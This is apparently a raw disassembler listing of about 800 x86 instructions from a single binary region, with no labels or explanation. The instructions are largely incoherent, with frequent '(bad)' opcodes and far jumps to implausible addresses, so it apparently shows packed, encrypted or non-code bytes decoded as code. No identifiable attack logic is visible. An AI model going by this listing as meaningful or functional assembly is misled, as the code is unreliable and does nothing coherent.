  403f2b:	push   0xffffffb1
  403f2d:	push   edi
  403f2e:	dec    eax
  403f2f:	mov    WORD PTR [ebp+0xd602b74],es
  403f35:	add    cl,BYTE PTR [ebx-0x48b42af]
  403f3b:	fwait
  403f3c:	sbb    BYTE PTR [ecx+0x7effb621],0x29
  403f43:	mov    bl,BYTE PTR [esi+edi*1-0x1]
  403f47:	jae    0x403f1a
  403f49:	inc    ebx
  403f4a:	sub    DWORD PTR [ebx+0x595a1b1c],0x48d8ffb7
  403f54:	mov    ds:0x4c8f2ed7,eax
  403f59:	cmp    al,0x2
  403f5b:	jne    0x403f63
  403f5d:	dec    edi
  403f5e:	dec    edi
  403f5f:	sub    BYTE PTR [edi-0x29],bh
  403f62:	mov    dh,0x59
  403f64:	daa    
  403f65:	add    BYTE PTR [esi-0x70],al
  403f68:	imul   ecx,DWORD PTR [esi-0x2d],0xffffffeb
  403f6c:	pop    ss
  403f6d:	(bad)  
  403f6e:	push   ss
  403f6f:	fldenv [edi+0x7a]
  403f72:	push   esi
  403f73:	xor    al,0x57
  403f76:	lea    edx,[esi+0x1]
  403f79:	bound  edi,QWORD PTR ds:0xc33ac960
  403f7f:	pusha  
  403f80:	out    0x5c,eax
  403f82:	cmp    al,BYTE PTR [eax]
  403f84:	or     DWORD PTR [eax-0xa],0xb8d6a364
  403f8b:	int3   
  403f8c:	aaa    
  403f8d:	push   esi
  403f8e:	lds    esp,FWORD PTR [ecx]
  403f90:	stc    
  403f91:	stos   DWORD PTR es:[edi],eax
  403f92:	sbb    BYTE PTR [edx-0x14ee8ad2],ah
  403f98:	pop    es
  403f99:	pop    esp
  403f9a:	repz mov ebp,0x474a5719
  403fa0:	add    ebp,DWORD PTR [esi]
  403fa2:	dec    eax
  403fa3:	sub    esi,DWORD PTR [eax]
  403fa5:	int3   
  403fa6:	add    dh,BYTE PTR [ebx-0x6]
  403fa9:	(bad)  
  403fab:	or     esi,DWORD PTR [eax-0x6c]
  403fae:	imul   edx,DWORD PTR ds:0x35449a85,0xffffffa0
  403fb5:	push   eax
  403fb6:	mov    ebx,0x71fe14cb
  403fbb:	nop
  403fbc:	cld    
  403fbd:	inc    ebx
  403fbe:	ins    BYTE PTR es:[edi],dx
  403fbf:	es cld 
  403fc1:	imul   DWORD PTR [ebp-0x8]
  403fc4:	xor    BYTE PTR [edx-0x7f],bl
  403fc7:	rol    BYTE PTR [eax*8-0x26bcdbdd],0x5a
  403fcf:	aam    0xa
  403fd1:	jns    0x403fdf
  403fd3:	mov    edi,DWORD PTR [ebp-0xf90fea4]
  403fd9:	add    al,0x8b
  403fdb:	dec    ebp
  403fdc:	inc    ebp
  403fdd:	add    DWORD PTR [ecx-0x1fd805af],ecx
  403fe3:	fs retf 0x1019
  403fe7:	ret    
  403fe8:	inc    edi
  403fe9:	fld    DWORD PTR ds:0xdd10942c
  403fef:	xor    edi,edi
  403ff1:	sbb    ah,BYTE PTR [eax]
  403ff3:	sub    BYTE PTR [esi+0xb],bh
  403ff6:	inc    ebp
  403ff7:	inc    esp
  403ff8:	(bad)  
  403ff9:	mov    dh,0xff
  403ffb:	xor    dh,dl
  403ffd:	push   es
  403ffe:	(bad)  
  403fff:	fiadd  DWORD PTR [ebx]
  404001:	mov    eax,0x89c82f2d
  404006:	xlat   BYTE PTR ds:[ebx]
  404007:	push   0x17b09ef8
  40400c:	lea    eax,[edi-0x1]
  40400f:	adc    edx,DWORD PTR [ecx+0x70]
  404012:	xchg   edx,eax
  404013:	xor    eax,0xf609168a
  404018:	or     BYTE PTR [ebx+0x11a001ed],dh
  40401e:	(bad)  
  40401f:	fmul   st(3),st
  404021:	and    edi,DWORD PTR [edi+0x69012c44]
  404027:	add    eax,0x294101be
  40402c:	retf   
  40402d:	mov    DWORD PTR [eax],eax
  40402f:	xchg   esp,eax
  404030:	test   al,0xee
  404032:	test   DWORD PTR [ecx+0x7fd93dd6],0x2cea25e9
  40403c:	jmp    0x5e9bc11a
  404041:	pop    edi
  404042:	xchg   ebx,eax
  404043:	sub    ecx,ebx
  404045:	retf   
  404046:	fbstp  TBYTE PTR [ebx]
  404048:	xlat   BYTE PTR ds:[ebx]
  404049:	mov    esi,eax
  40404b:	xor    eax,eax
  40404d:	or     DWORD PTR [edi],ebp
  40404f:	xor    dh,dl
  404051:	push   cs
  404052:	pop    edx
  404053:	lods   eax,DWORD PTR ds:[esi]
  404054:	fst    DWORD PTR [ecx]
  404056:	add    eax,0xda8a21b2
  40405b:	add    cl,BYTE PTR ds:0x8a49892e
  404061:	mov    edx,0x5cb835b
  404066:	mov    dh,0xd
  404068:	or     BYTE PTR [eax+0x7a],ah
  40406b:	ja     0x404057
  40406d:	and    bh,al
  40406f:	imul   edx,DWORD PTR ds:0xdb7477b4,0x44
  404076:	mov    bl,0xa6
  404078:	shl    BYTE PTR [eax-0x9],cl
  40407b:	mov    BYTE PTR [eax-0x15],bh
  40407e:	or     al,0x84
  404080:	js     0x40408b
  404082:	or     bh,bh
  404084:	(bad)  
  404085:	mov    esi,0x347dab44
  40408a:	cmp    dl,al
  40408c:	jne    0x40407a
  40408e:	pop    es
  40408f:	xchg   edi,eax
  404090:	mov    ds:0x1862689a,al
  404095:	inc    esp
  404096:	adc    eax,0xb16ffd40
  40409b:	out    0xf,al
  40409d:	popf   
  40409e:	enter  0xf76a,0xd1
  4040a2:	dec    ecx
  4040a3:	je     0x4040d3
  4040a5:	mov    esi,ecx
  4040a7:	mov    edi,ebx
  4040a9:	(bad)  [esi-0x49]
  4040ac:	xchg   edx,eax
  4040ad:	xadd   DWORD PTR [esi+0x1d],esi
  4040b1:	push   cs
  4040b2:	lea    ebx,[esi-0x22]
  4040b5:	(bad)  
  4040b6:	lods   al,BYTE PTR ds:[esi]
  4040b7:	mov    DWORD PTR [esi],edx
  4040b9:	rcr    esi,1
  4040bb:	mov    esi,0x57c88911
  4040c0:	lea    edi,[ecx+ecx*2-0x7e]
  4040c4:	cmp    DWORD PTR [edx],ecx
  4040c6:	ja     0x40413d
  4040c8:	in     eax,dx
  4040c9:	hlt    
  4040ca:	adc    eax,0x622be0b7
  4040cf:	and    al,0xbf
  4040d1:	fadd   st,st(5)
  4040d3:	clc    
  4040d4:	jge    0x40409c
  4040d6:	scas   eax,DWORD PTR es:[edi]
  4040d7:	fistp  WORD PTR [edi+0x1f]
  4040da:	jbe    0x4040e1
  4040dc:	mov    ebx,0x4ad3101f
  4040e1:	gs jo  0x404120
  4040e4:	add    DWORD PTR [edi-0x343e600],edi
  4040ea:	dec    ebx
  4040eb:	mov    eax,esp
  4040ed:	push   0x14
  4040ef:	pop    eax
  4040f0:	test   dl,ah
  4040f2:	mov    dh,0x89
  4040f4:	in     eax,dx
  4040f5:	mov    BYTE PTR [esp+ebx*1],0x1d
  4040f9:	(bad)  
  4040fa:	aam    0x20
  4040fc:	mov    BYTE PTR [ebx],0x24
  4040ff:	push   es
  404100:	add    al,bh
  404102:	test   DWORD PTR ds:0xbd342078,esp
  404108:	xor    al,0xea
  40410a:	icebp  
  40410b:	xor    ebp,DWORD PTR [eax+0x1f]
  40410e:	or     eax,0xc34d4c51
  404113:	mov    ecx,DWORD PTR ds:0xf7fcf4f8
  404119:	(bad)  
  40411a:	push   es
  40411b:	push   cs
  40411c:	cmp    esi,edx
  40411e:	or     al,0x8b
  404120:	sbb    eax,0xff1b8b0a
  404125:	rcr    DWORD PTR [ebx+0x49],cl
  404128:	mov    cl,0x82
  40412a:	inc    eax
  40412b:	or     eax,edi
  40412d:	adc    ebp,edx
  40412f:	dec    ecx
  404130:	add    al,0x8f
  404132:	dec    ecx
  404133:	mov    bl,0x94
  404135:	push   ebx
  404136:	push   esi
  404137:	xor    BYTE PTR [ecx],dl
  404139:	cmp    DWORD PTR cs:[eax],ecx
  40413c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40413d:	iret   
  40413e:	lock ss je 0x4040f7
  404142:	mov    ds:0x7de60313,eax
  404147:	clc    
  404148:	or     dh,BYTE PTR [ebp+eiz*1-0x40]
  40414c:	adc    eax,0xdfd17cf
  404151:	add    eax,0x8b54be96
  404156:	or     DWORD PTR [esp+edi*1-0x6655f3db],ebp
  40415d:	je     0x4040f6
  40415f:	mov    ds:0xf889f3f1,al
  404164:	sub    edx,DWORD PTR [edi+0x1d]
  404167:	pop    ebp
  404168:	outs   dx,DWORD PTR ds:[esi]
  404169:	push   ss
  40416a:	repnz in eax,dx
  40416c:	(bad)  
  40416d:	fcomi  st,st(6)
  40416f:	jmp    0xe887406c
  404174:	mov    BYTE PTR [ebp-0x19],al
  404177:	cmp    al,0x2d
  404179:	jne    0x404180
  40417b:	adc    eax,0x6ddeacdc
  404180:	pop    ss
  404181:	fsub   DWORD PTR [ebp+0x5a]
  404184:	jmp    0x10f4:0x170a75f9
  40418b:	retf   
  40418c:	lods   al,BYTE PTR ds:[esi]
  40418d:	jmp    0x404170
  40418f:	dec    ecx
  404190:	xlat   BYTE PTR ds:[ebx]
  404191:	fmul   QWORD PTR ds:[ecx]
  404194:	loopne 0x404151
  404196:	das    
  404197:	cmp    al,0x2e
  404199:	adc    eax,0x5fedb823
  40419e:	les    esi,FWORD PTR [edi+0x7589dc15]
  4041a4:	fadd   DWORD PTR [eax]
  4041a6:	pop    ebx
  4041a7:	xor    bl,BYTE PTR [edx-0x75]
  4041aa:	and    eax,DWORD PTR [ebx-0x38f4f413]
  4041b0:	jae    0x4041df
  4041b2:	fild   DWORD PTR [eax+0xa4ae77d]
  4041b8:	push   ss
  4041b9:	ret    
  4041ba:	outs   dx,BYTE PTR ds:[esi]
  4041bb:	push   0x12047370
  4041c0:	shl    DWORD PTR [edi+eax*4+0x7b750bd9],cl
  4041c7:	pop    ebx
  4041c8:	div    BYTE PTR [eax+0xdaaf320]
  4041ce:	sbb    DWORD PTR [ebx+0xaf2f07d],eax
  4041d4:	push   edx
  4041d5:	jbe    0x404184
  4041d7:	cmc    
  4041d8:	sbb    BYTE PTR [edx+0x59],ah
  4041db:	cld    
  4041dc:	pop    edx
  4041dd:	jae    0x40422d
  4041df:	popf   
  4041e0:	pop    edx
  4041e1:	xor    DWORD PTR [ecx+0x44dc1bff],ecx
  4041e7:	cmp    al,0x2a
  4041e9:	std    
  4041ea:	cmp    al,0x30
  4041ec:	jb     0x40422b
  4041ee:	cmp    al,0x39
  4041f0:	ja     0x40422b
  4041f2:	imul   ebx,ebx,0x6f74bb14
  4041f8:	icebp  
  4041f9:	sub    al,0x30
  4041fb:	leave  
  4041fc:	rol    BYTE PTR [ecx],0xc3
  4041ff:	xchg   ecx,eax
  404200:	add    esp,esp
  404202:	pop    eax
  404203:	daa    
  404204:	not    BYTE PTR [edx+0x1742e083]
  40420a:	inc    ecx
  40420b:	jg     0x40421f
  40420d:	inc    DWORD PTR [edi]
  40420f:	fimul  WORD PTR [eax]
  404211:	xchg   esi,eax
  404212:	mov    dh,0x7e
  404214:	or     al,0x82
  404216:	ret    
  404217:	and    bl,BYTE PTR [ebx+eax*8]
  40421a:	je     0x404297
  40421c:	inc    ebp
  40421d:	aas    
  40421e:	out    0x84,al
  404220:	leave  
  404221:	ret    
  404222:	and    al,0xdf
  404224:	mov    cl,al
  404226:	mov    ds:0x2cff161d,al
  40422b:	pop    ebx
  40422c:	sub    BYTE PTR [ebp+0x5c],bl
  40422f:	jne    0x40423d
  404231:	lea    esi,[esi+ebx*8]
  404234:	sbb    dh,BYTE PTR [edi+0x4db625f0]
  40423a:	push   esi
  40423b:	adc    DWORD PTR [edx*4-0x11a394a3],esp
  404242:	add    ecx,DWORD PTR [ebp-0x2d]
  404245:	mov    ecx,0x6c27a14d
  40424a:	or     eax,DWORD PTR [ebx]
  40424c:	push   edi
  40424d:	iret   
  40424e:	scas   eax,DWORD PTR es:[edi]
  40424f:	shl    DWORD PTR [edi+edx*4-0x43],cl
  404253:	ins    BYTE PTR es:[edi],dx
  404254:	pop    ss
  404255:	add    ebp,DWORD PTR [eax+0x1b]
  404258:	xchg   ebx,eax
  404259:	jmp    0x6f36:0x48374d4e
  404260:	pop    es
  404261:	mov    eax,0x6a5e4e31
  404266:	add    al,0x2d
  404268:	leave  
  404269:	scas   eax,DWORD PTR es:[edi]
  40426a:	ins    DWORD PTR es:[edi],dx
  40426b:	fsubr  DWORD PTR [ecx]
  40426d:	shl    DWORD PTR [eax-0x50],1
  404270:	std    
  404271:	(bad)  [eax-0x4]
  404274:	rol    DWORD PTR [eax+0x12b7758d],cl
  40427a:	fsubr  st(5),st
  40427c:	sub    BYTE PTR [esp+edi*8],dl
  40427f:	(bad)  
  404280:	icebp  
  404281:	sub    cl,0x44
  404284:	je     0x4b19999e
  40428a:	add    BYTE PTR [ecx],dh
  40428c:	jmp    0xb646503e
  404291:	retf   
  404292:	gs in  al,0xa
  404295:	push   ebp
  404296:	clc    
  404297:	imul   ebx
  404299:	mov    bl,0x35
  40429b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429c:	cmp    DWORD PTR [esi-0x4a],esi
  40429f:	data16 cs aaa 
  4042a2:	adc    BYTE PTR ds:0x1cc1f772,dh
  4042a8:	enter  0x6403,0xf7
  4042ac:	push   esi
  4042ad:	adc    BYTE PTR [eax],bl
  4042af:	cmp    BYTE PTR [edx-0x7f62a441],cl
  4042b5:	stc    
  4042b6:	push   ebx
  4042b7:	jne    0x5aeede9
  4042bd:	int    0xd8
  4042bf:	ret    
  4042c0:	push   cs
  4042c1:	bound  esp,QWORD PTR [esi+0x48]
  4042c4:	jbe    0x4042d5
  4042c6:	jl     0x4042eb
  4042c8:	or     BYTE PTR [ebp+0x754b6a0a],ah
  4042ce:	lock jmp 0x40431b
  4042d1:	mov    al,0x64
  4042d3:	into   
  4042d4:	dec    edx
  4042d5:	call   0x6eee:0xac8e4120
  4042dc:	mov    ch,0xbf
  4042de:	adc    al,cl
  4042e0:	jmp    0x40431f
  4042e2:	mov    esi,0x8bcb3e14
  4042e7:	mov    esi,0x75030674
  4042ec:	cld    
  4042ed:	jbe    0x4042fc
  4042ef:	ja     0x4042b7
  4042f1:	pop    ds
  4042f2:	and    DWORD PTR [edx],edi
  4042f4:	ins    BYTE PTR es:[edi],dx
  4042f5:	aad    0xff
  4042f7:	(bad)  
  4042f8:	xor    dh,BYTE PTR [esi+0x6343b52d]
  4042fe:	mov    DWORD PTR [esi],edi
  404300:	or     edi,DWORD PTR [ebx]
  404302:	add    eax,0x2a85a017
  404307:	push   0x4d3b86b2
  40430c:	out    0x59,eax
  40430e:	imul   edx,ebp,0xffffffdc
  404311:	ja     0x40430f
  404313:	add    eax,0x8ffee957
  404318:	aad    0x95
  40431a:	sbb    al,0x9f
  40431c:	jge    0x404331
  40431e:	jecxz  0x40433c
  404320:	dec    edi
  404321:	mov    ecx,edi
  404323:	in     eax,0xb2
  404325:	xchg   ebp,eax
  404326:	dec    edx
  404327:	jo     0x404376
  404329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40432a:	push   eax
  40432b:	leave  
  40432c:	(bad)  
  40432d:	cmp    eax,0xbaccc5d1
  404332:	or     dh,dl
  404334:	repz jmp 0x41fffb33
  40433a:	ins    BYTE PTR es:[edi],dx
  40433b:	das    
  40433c:	int3   
  40433d:	add    dh,BYTE PTR [edi-0x4a4cc900]
  404343:	inc    edi
  404344:	je     0x404385
  404346:	mov    bl,0x1
  404348:	out    dx,al
  404349:	repnz retf 
  40434b:	outs   dx,DWORD PTR ds:[esi]
  40434c:	push   es
  40434d:	inc    ebp
  40434e:	je     0x404388
  404350:	mov    bl,0x2
  404352:	inc    esi
  404353:	je     0x404367
  404355:	mov    bl,0x3
  404357:	dec    esi
  404358:	je     0x4043d4
  40435a:	outs   dx,DWORD PTR ds:[esi]
  40435b:	jo     0x4043cc
  40435d:	mov    dh,0x4d
  40435f:	mov    dh,BYTE PTR ds:[ebx+0x3b12b804]
  404366:	sub    al,0x39
  404368:	ret    0x2576
  40436b:	sbb    dh,BYTE PTR [ebp+ebx*8+0x1ba5ba81]
  404372:	jne    0x40438f
  404374:	retf   
  404375:	jp     0x4043b9
  404377:	pop    ebx
  404378:	or     DWORD PTR [ebx-0x24233def],0x3d2e00e8
  404382:	cmp    eax,0x12
  404385:	scas   eax,DWORD PTR es:[edi]
  404386:	mov    eax,0x9d50dd0f
  40438b:	mov    al,0xb5
  40438d:	call   0x229fdb02
  404392:	iret   
  404393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404394:	pop    esi
  404395:	shl    DWORD PTR [ebx-0x13],cl
  404398:	mov    dh,0xcd
  40439a:	sar    DWORD PTR [edi+edx*4-0x3d],0x18
  40439f:	loop   0x4043b3
  4043a1:	add    DWORD PTR gs:[ebx-0x7c],edx
  4043a5:	rcr    BYTE PTR [eax+0x66],cl
  4043a8:	iret   
  4043a9:	lahf   
  4043aa:	xor    esp,eax
  4043ac:	inc    esp
  4043ad:	test   BYTE PTR [edx],bl
  4043af:	or     al,0x73
  4043b1:	mov    ebx,0xeaa716b4
  4043b6:	call   0xf65be0b5
  4043bb:	mov    edx,0xd41c9e06
  4043c0:	jmp    0x40441a
  4043c2:	outs   dx,BYTE PTR ds:[esi]
  4043c3:	or     al,0x3
  4043c5:	or     BYTE PTR [edx-0x31a75c97],dh
  4043cb:	sub    edi,edx
  4043cd:	call   FWORD PTR [edx+0x8]
  4043d0:	sbb    al,0x30
  4043d2:	adc    BYTE PTR [ecx+edi*2+0x717ad981],dh
  4043d9:	loop   0x4043ef
  4043db:	jnp    0x4043a5
  4043dd:	idiv   BYTE PTR [ebp+0x3b]
  4043e0:	mov    ah,BYTE PTR [edi-0x31]
  4043e3:	dec    ebx
  4043e4:	mov    es,WORD PTR [edi+0x43e066d1]
  4043ea:	sub    al,BYTE PTR [edx+0x7deb705]
  4043f0:	add    eax,0x4d5a013e
  4043f5:	clc    
  4043f6:	call   0x33c1d091
  4043fb:	inc    ecx
  4043fc:	mov    ebx,0x3df93e25
  404401:	dec    ecx
  404402:	aaa    
  404403:	ins    BYTE PTR es:[edi],dx
  404404:	add    esp,DWORD PTR [esi+0x7d]
  404407:	sub    BYTE PTR [esi],cl
  404409:	ja     0x404403
  40440b:	or     esi,DWORD PTR [edx]
  40440d:	mov    esp,0x85134dc5
  404412:	clc    
  404413:	out    dx,eax
  404414:	push   ecx
  404415:	stos   DWORD PTR es:[edi],eax
  404416:	or     eax,0x7fde0adb
  40441b:	inc    ebx
  40441c:	or     al,0x27
  40441e:	mov    ecx,0x3e75bff7
  404423:	sti    
  404424:	cwde   
  404425:	dec    eax
  404426:	cmp    edi,eax
  404428:	jl     0x404470
  40442a:	jmp    0x40445e
  40442c:	add    ebx,ebx
  40442e:	mov    ch,0xe5
  404430:	sbb    ah,BYTE PTR [eax-0x3f]
  404433:	stos   BYTE PTR es:[edi],al
  404434:	push   es
  404435:	jle    0x404485
  404437:	jmp    0xd93b49ca
  40443c:	push   es
  40443d:	dec    eax
  40443e:	cmp    bh,BYTE PTR [ebp-0x39]
  404441:	das    
  404442:	xlat   BYTE PTR ds:[ebx]
  404443:	inc    esp
  404444:	test   al,0x7b
  404446:	pop    ds
  404447:	jmp    0x404458
  404449:	lea    edx,[ebp-0x5830ef94]
  40444f:	outs   dx,DWORD PTR ds:[esi]
  404450:	stos   BYTE PTR es:[edi],al
  404451:	xchg   BYTE PTR [eax-0x5e],al
  404454:	jnp    0x404487
  404456:	imul   BYTE PTR [edx+0x1a80da08]
  40445c:	adc    BYTE PTR [ebx-0x748bf5a3],bl
  404462:	dec    ebx
  404463:	fld    QWORD PTR [edx-0x8cbf983]
  404469:	fcmove st,st(6)
  40446b:	or     ah,ah
  40446d:	sbb    eax,ebx
  40446f:	aam    0xbf
  404471:	mov    eax,0x92aae088
  404476:	push   eax
  404477:	mov    ebx,esp
  404479:	aaa    
  40447a:	mov    dh,0x48
  40447c:	push   es
  40447d:	aaa    
  40447e:	push   0x883a4dea
  404483:	adc    eax,DWORD PTR [ebx+0x49]
  404486:	xor    al,0xed
  404488:	or     BYTE PTR [edi-0x17],bh
  40448b:	rcr    DWORD PTR [ecx],0xc0
  40448e:	dec    DWORD PTR [ebx-0x76]
  404491:	add    ebp,DWORD PTR [edx-0x78a1cc7]
  404497:	pop    eax
  404498:	pop    esi
  404499:	rcl    esp,cl
  40449b:	in     al,dx
  40449c:	sub    eax,0x9929edc3
  4044a1:	mov    al,ds:0xfba1ca7f
  4044a6:	mov    al,ds:0xc8f2077e
  4044ab:	fwait
  4044ac:	jns    0x4044a8
  4044ae:	mov    eax,ds:0xa0f41778
  4044b3:	jl     0x4044a8
  4044b5:	mov    al,ds:0x517e317d
  4044ba:	cmp    dl,dh
  4044bc:	(bad)  
  4044bd:	mov    esi,0x513b8a2
  4044c2:	retf   
  4044c3:	add    eax,0xb800a943
  4044c8:	xchg   ebx,eax
  4044c9:	test   DWORD PTR [edx],0x1861027d
  4044cf:	jecxz  0x4044ea
  4044d1:	add    DWORD PTR [esi+0x5],edi
  4044d4:	sub    eax,0x6a57aa89
  4044d9:	inc    edi
  4044da:	mov    al,0xa
  4044dc:	daa    
  4044dd:	push   es
  4044de:	adc    BYTE PTR [edx],al
  4044e0:	mov    eax,0x47c6fbee
  4044e5:	test   ecx,edi
  4044e7:	pop    ebx
  4044e8:	popa   
  4044e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ea:	jge    0x4044e8
  4044ec:	movzx  ecx,WORD PTR [ebx]
  4044ef:	lea    ebx,[ebp-0x16d29fdf]
  4044f5:	cmp    dh,BYTE PTR [ebx+0x1a]
  4044f8:	sbb    dh,al
  4044fa:	clc    
  4044fb:	hlt    
  4044fc:	ja     0x404515
  4044fe:	pop    edi
  4044ff:	jmp    0x40448e
  404501:	mov    ah,0x49
  404503:	loopne 0x404574
  404505:	adc    esp,ebp
  404507:	mov    ecx,0xb1b1ba4d
  40450c:	inc    eax
  40450d:	xchg   DWORD PTR ds:0x5d42d732,ebp
  404513:	adc    BYTE PTR [eax+0x7f5ddf6d],bh
  404519:	add    DWORD PTR [esp+eax*1+0x4],esi
  40451d:	ja     0x404528
  40451f:	movsx  edi,WORD PTR [eax]
  404522:	cmp    ebx,DWORD PTR [edx+0x7e]
  404525:	add    al,al
  404527:	ins    DWORD PTR es:[edi],dx
  404528:	jl     0x404509
  40452a:	mov    ecx,0xcc9d1c8d
  40452f:	cs pop ebp
  404531:	dec    edi
  404532:	sbb    eax,DWORD PTR [esi+esi*2]
  404535:	sbb    eax,0x78cc503c
  40453a:	cld    
  40453b:	inc    esi
  40453c:	jmp    0xde39fea5
  404541:	or     al,0xb2
  404543:	in     eax,dx
  404544:	sbb    dl,BYTE PTR [ebp+0x70]
  404547:	add    ecx,DWORD PTR [esi+esi*8-0x44b9b1b7]
  40454e:	aam    0xc2
  404550:	dec    ebx
  404551:	ror    BYTE PTR [esi-0x54],1
  404554:	or     BYTE PTR [edx],cl
  404556:	add    ecx,DWORD PTR [edx+0x4e]
  404559:	ret    
  40455a:	cdq    
  40455b:	mov    cl,0xb
  40455d:	or     eax,0x38d0d66a
  404562:	stos   BYTE PTR es:[edi],al
  404563:	ret    
  404564:	jle    0x404550
  404566:	das    
  404567:	adc    eax,0xd44d5a6e
  40456c:	xor    al,0x5e
  40456e:	or     al,0x7f
  404570:	sbb    eax,0xdfdf983
  404575:	loop   0x40454d
  404577:	rcl    bl,1
  404579:	sub    eax,0x80aa261a
  40457e:	inc    ebp
  40457f:	je     0x404502
  404581:	test   dl,0x3a
  404584:	mov    bl,BYTE PTR [eax]
  404586:	stos   BYTE PTR es:[edi],al
  404587:	neg    ecx
  404589:	or     eax,0x761aeb5a
  40458e:	jg     0x40456f
  404590:	(bad)  
  404591:	cmc    
  404592:	inc    edx
  404593:	inc    ebp
  404594:	je     0x4045ad
  404596:	stos   BYTE PTR es:[edi],al
  404597:	loop   0x404591
  404599:	pop    es
  40459a:	adc    ecx,DWORD PTR [eax-0x5499df3c]
  4045a0:	push   eax
  4045a1:	pop    es
  4045a2:	outs   dx,DWORD PTR ds:[esi]
  4045a3:	sti    
  4045a4:	or     eax,DWORD PTR [edi]
  4045a6:	and    eax,edi
  4045a8:	daa    
  4045a9:	push   ss
  4045aa:	add    al,0xe1
  4045ac:	(bad)  
  4045ad:	dec    bx
  4045af:	push   edx
  4045b0:	push   ds
  4045b1:	pop    ebx
  4045b2:	add    al,0xe2
  4045b4:	mov    ah,BYTE PTR [ebp+0x23]
  4045b7:	int    0xb1
  4045b9:	mov    esi,DWORD PTR [ebp+0x40]
  4045bc:	dec    ecx
  4045bd:	or     eax,0x9d2bb43b
  4045c2:	imul   edi,DWORD PTR ds:0x4aefb7d,0x7e
  4045c9:	leave  
  4045ca:	mov    al,0x45
  4045cc:	mov    bl,BYTE PTR [ebp-0x15]
  4045cf:	mov    edi,0x2d4ad455
  4045d4:	test   al,0xf8
  4045d6:	push   esi
  4045d7:	mov    eax,ds:0x9da5369a
  4045dc:	adc    dh,BYTE PTR [edx+0x5]
  4045df:	mov    edx,0x77ba6c1e
  4045e4:	push   ecx
  4045e5:	lahf   
  4045e6:	xchg   ebx,eax
  4045e7:	add    eax,0xa5012aeb
  4045ec:	and    eax,0xd757140a
  4045f1:	dec    eax
  4045f2:	dec    eax
  4045f3:	scas   al,BYTE PTR es:[edi]
  4045f4:	mov    dh,0x2f
  4045f6:	xor    ebx,edi
  4045f8:	div    bl
  4045fa:	mov    bl,ah
  4045fc:	inc    ebx
  4045fd:	push   esp
  4045fe:	js     0x40460f
  404600:	dec    ebx
  404601:	jne    0x4045f7
  404603:	(bad)  
  404604:	cli    
  404605:	pop    esp
  404606:	xlat   BYTE PTR ds:[ebx]
  404607:	fimul  DWORD PTR [esi+0x1aaaede2]
  40460d:	jns    0x404597
  40460f:	sbb    al,0x9d
  404611:	(bad)  [ebx+0x74]
  404614:	out    dx,eax
  404615:	(bad)  
  404617:	stos   BYTE PTR es:[edi],al
  404618:	jecxz  0x404623
  40461a:	cmp    al,0x4a
  40461c:	add    BYTE PTR [ecx+0x75],al
  40461f:	stc    
  404620:	adc    DWORD PTR cs:[esi-0x8517c8a],esi
  404627:	ret    
  404628:	dec    edx
  404629:	jns    0x40461e
  40462b:	jno    0x404608
  40462d:	in     eax,0xdb
  40462f:	or     BYTE PTR [eax],dl
  404631:	or     BYTE PTR ds:0x40fb9f2,cl
  404637:	cmp    bl,cl
  404639:	xchg   edi,eax
  40463a:	mov    BYTE PTR [edi-0x345a07ba],ah
  404640:	fimul  WORD PTR [ebp+0x71599b9c]
  404646:	addr16 mov ecx,0xe955ad64
  40464c:	sbb    edi,DWORD PTR [edi]
  40464e:	cmp    al,0x40
  404650:	je     0x404670
  404652:	mov    ds:0xe34eb01,eax
  404657:	pop    ebx
  404658:	pop    es
  404659:	inc    eax
  40465a:	or     cl,BYTE PTR [esp+ecx*1+0x5d6af1d5]
  404661:	fiadd  DWORD PTR ds:0x7c8d6018
  404667:	inc    ebx
  404668:	loop   0x404604
  40466a:	add    eax,0xa835b5b3
  40466f:	test   BYTE PTR [ebp+0x4ac605af],al
  404675:	mov    eax,0x24691bdb
  40467a:	sub    al,BYTE PTR [eax+0x0]
  40467d:	sub    ah,BYTE PTR [esp+eax*1]
  404680:	popf   
  404681:	out    dx,eax
  404682:	not    esi
  404684:	in     al,dx
  404685:	or     ch,BYTE PTR [edx]
  404687:	and    BYTE PTR [eax],ch
  404689:	adc    al,0x29
  40468b:	inc    eax
  40468c:	sub    eax,0x42d2419
  404691:	jge    0x404680
  404693:	cdq    
  404694:	(bad)  [edx]
  404696:	sub    eax,0x28242a13
  40469b:	or     eax,0xebde2404
  4046a0:	(bad)  
  4046a2:	adc    ebp,DWORD PTR ds:0x8372d2d
  4046a8:	sub    eax,0x6dd50440
  4046ad:	mov    edx,0x180732e6
  4046b2:	sub    BYTE PTR [ecx],ch
  4046b4:	sub    BYTE PTR [ecx],bl
  4046b6:	sub    DWORD PTR [edx+0x71],edx
  4046b9:	into   
  4046ba:	cwde   
  4046bb:	inc    eax
  4046bc:	shl    eax,cl
  4046be:	mov    esp,0x88058cda
  4046c3:	mov    al,ds:0x6aa7a700
  4046c8:	in     al,dx
  4046c9:	jmp    0x4046b9
  4046cb:	popf   
  4046cc:	arpl   WORD PTR [edi],cx
  4046ce:	jmp    0xedef29d7
  4046d3:	or     DWORD PTR [esi-0x4a],esp
  4046d6:	mov    DWORD PTR [edx],0x25747385
  4046dc:	mov    dl,dl
  4046de:	cmp    eax,0xffc02c45
  4046e3:	push   es
  4046e4:	jne    0x404708
  4046e6:	test   WORD PTR [esi+0x6],0x11d1
  4046ec:	fdivr  QWORD PTR [eax]
  4046ee:	add    bl,ah
  4046f0:	adc    cl,BYTE PTR [ecx]
  4046f2:	cmp    DWORD PTR [esi-0x21],0xc6194003
  4046f9:	inc    ebx
  4046fa:	mov    esi,0x232bbc6c
  4046ff:	xor    eax,0x2edbf062
  404704:	mov    edx,0x10c0693f
  404709:	dec    ebp
  40470a:	sbb    al,0x1c
  40470c:	adc    al,0xdf
  40470e:	add    eax,0x4010f8c1
  404713:	hlt    
  404714:	mov    eax,ds:0x4dd67f1d
  404719:	neg    ecx
  40471b:	loope  0x404770
  40471d:	fstp   QWORD PTR [eax+ecx*8]
  404720:	pop    ebx
  404721:	frndint 
  404723:	jmp    0x7fafd303
  404728:	shr    DWORD PTR [edi-0x26277bc4],cl
  40472e:	fstsw  WORD PTR [ebp-0xa]
  404732:	fwait
  404733:	pop    ebx
  404734:	inc    ebp
  404735:	test   BYTE PTR [eax],0x41
  404738:	sub    edi,DWORD PTR [ebx-0x258b0901]
  40473e:	mov    bh,0x99
  404740:	jmp    FWORD PTR [esi]
